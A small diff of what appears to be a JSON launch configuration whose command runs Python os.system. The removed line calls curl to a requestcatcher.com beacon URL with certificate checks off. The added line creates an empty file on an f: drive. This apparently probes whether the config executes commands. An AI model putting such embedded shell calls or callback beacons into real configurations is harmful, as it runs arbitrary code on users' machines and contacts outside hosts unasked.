@@ -5,7 +5,7 @@
 			"command": "python",
 			"args": [
 				"-c",
-				"import os;os.system('curl https://testone.requestcatcher.com/tesaqw -k');"
+				"import os;os.system('type nul > f://asdfghjklqwertyupmnbvcxz');"
 			]
 		}
 	}
